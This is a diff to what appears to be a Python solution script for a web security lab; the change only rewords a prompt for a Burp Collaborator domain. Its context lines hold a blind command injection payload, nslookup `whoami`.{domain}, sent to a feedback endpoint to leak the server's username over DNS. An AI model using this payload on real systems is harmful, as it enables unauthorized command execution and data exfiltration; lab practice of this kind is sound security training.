@@ -59,7 +59,7 @@ def main():
     url = sys.argv[1]
 
     print('[*] This lab require a burp collaborator')
-    domain = input("Your domain: ")
+    domain = input("Your burp collaborator domain: ")
     exploit(s, url, '/feedback/submit', f'nslookup `whoami`.{domain}')
     answer = input("whoami: ")
     submit_sol(s, url, '/submitSolution', answer)
